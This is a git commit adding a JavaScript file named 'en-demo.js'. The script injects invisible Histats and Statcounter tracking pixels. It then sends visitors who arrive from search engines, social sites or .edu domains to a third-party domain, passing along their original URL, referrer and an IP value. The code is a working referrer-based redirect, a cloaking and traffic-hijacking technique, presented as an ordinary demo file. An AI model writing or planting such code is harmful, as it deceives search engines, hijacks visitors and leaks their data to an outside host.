fa6338beccfbb37294a0921fb5fef1eeed03d48d
pgpump <pg079898@gmail.com>
2025-05-06 01:08:08 +0700

    Create en-demo.js

---
+++ arsa/en-demo.js
@@ -0,0 +1,25 @@
+///// Histats /////
+document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4825766&101"width="0" height="0"/>');
+
+///// Statcounter /////
+
+var sc_project=12978198; 
+var sc_invisible=1; 
+var sc_security="9f31a33b"; 
+
+document.write('<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>');
+document.write('<noscript>');
+document.write('<div class="statcounter">');
+document.write('<a title="Web Analytics" href="https://statcounter.com/" target="_blank">');
+document.write('<img class="statcounter" src="https://c.statcounter.com/12978198/0/9f31a33b/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">');
+document.write('</a>');
+document.write('</div>');
+document.write('</noscript>');
+
+
+///// Arsae /////
+var arsT1Bing = 'https://en.yourkitchenist.com';
+
+if(['google.', '.edu.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
+	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
+}
